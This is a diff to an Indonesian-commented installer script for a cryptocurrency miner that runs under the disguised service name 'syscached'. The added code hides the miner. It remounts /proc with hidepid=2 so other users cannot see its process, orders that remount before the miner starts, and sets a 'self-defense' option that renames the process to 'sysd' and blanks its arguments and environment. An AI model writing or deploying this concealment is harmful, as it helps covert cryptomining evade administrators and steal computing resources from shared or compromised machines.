@@ -8,7 +8,8 @@
 #        sudo ./install.sh --version v1.0.0 --wallet <alamat> --worker <nama>
 #
 # Skrip ini hanya menyentuh host lokal: binary + library, /etc/xcb/miner.env,
-# sysctl hugepages, wrapper sysd, dan unit syscached. Tidak menghubungi host lain.
+# sysctl hugepages, wrapper sysd, unit syscached, dan hidepid /proc. Tidak
+# menghubungi host lain.
 set -eu
 
 REPO="ylxai/xcb-v2"
@@ -18,6 +19,8 @@ CONF_DIR="/etc/xcb"
 CONF="${CONF_DIR}/miner.env"
 UNIT="/etc/systemd/system/syscached.service"
 SVC="syscached"
+HIDE_UNIT="/etc/systemd/system/xcb-proc-hidepid.service"
+HIDE_DROPIN="/etc/systemd/system/${SVC}.service.d/10-hidepid.conf"
 SYSCTL_CONF="/etc/sysctl.d/99-miner-hugepages.conf"
 POOL="eu.rplant.xyz:17194"
 
@@ -220,6 +223,9 @@ CONN_POOL=${POOL}
 WALLET=${WALLET}
 WORKER=${WORKER}
 THREADS=${THREADS}
+# Nama proses di ps + argv/env dikosongkan; hanya berlaku pada build
+# ENABLE_SELF_DEFENSE=ON, diabaikan oleh build biasa.
+XCB_TITLE=sysd
 EOF
         )
         chmod 0600 "$CONF"
@@ -229,16 +235,51 @@ fi
 
 run install -m 0644 "${SRC}/syscached.service" "$UNIT"
 
+# hidepid=2: non-root tidak melihat proses user lain di /proc, termasuk miner.
+# Drop-in memastikan remount /proc selesai sebelum syscached start.
+run install -d -m 0755 "$(dirname "$HIDE_DROPIN")"
+if [ "$DRY" -eq 1 ]; then
+    printf '[dry-run] tulis %s (0644)\n' "$HIDE_UNIT"
+    printf '[dry-run] tulis %s (0644)\n' "$HIDE_DROPIN"
+else
+    cat > "$HIDE_UNIT" <<'EOF'
+[Unit]
+Description=Hide other users' processes in /proc
+DefaultDependencies=no
+After=local-fs.target
+Before=syscached.service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/mount -o remount,hidepid=2 /proc
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    chmod 0644 "$HIDE_UNIT"
+    cat > "$HIDE_DROPIN" <<'EOF'
+[Unit]
+Wants=xcb-proc-hidepid.service
+After=xcb-proc-hidepid.service
+EOF
+    chmod 0644 "$HIDE_DROPIN"
+    log "hidepid: ${HIDE_UNIT} + ${HIDE_DROPIN}"
+fi
+
 if [ "$DRY" -eq 0 ]; then
     systemctl daemon-reload
+    systemctl enable xcb-proc-hidepid.service >/dev/null 2>&1 || true
+    systemctl start xcb-proc-hidepid.service || true
     systemctl enable "$SVC" >/dev/null 2>&1 || true
     systemctl restart "$SVC"
     sleep 5
     log "status: $(systemctl is-active "$SVC")"
     log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
-    # Nama proses tetap xcb sampai XCB_TITLE aktif (butuh build self-defense);
-    # tanpa itu wrapper hanya menyembunyikan path dan flag dari unit metadata.
+    # Dengan XCB_TITLE (build self-defense) comm menjadi sysd dan argv kosong;
+    # build biasa tetap tampil sebagai xcb.
     log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[x]cb|[s]ysd'"
+    log "cek hidepid: grep ' /proc ' /proc/mounts | grep -o 'hidepid=[a-z0-9]*'"
     if [ -f "${PREFIX}/xcb.bak-${STAMP}" ]; then
         log "rollback: install -m 0755 ${PREFIX}/xcb.bak-${STAMP} ${PREFIX}/xcb && install -m 0755 ${PREFIX}/librandomx_v2.so.bak-${STAMP} ${PREFIX}/librandomx_v2.so && install -m 0644 ${UNIT}.bak-${STAMP} ${UNIT} && systemctl daemon-reload && systemctl restart ${SVC}"
     fi
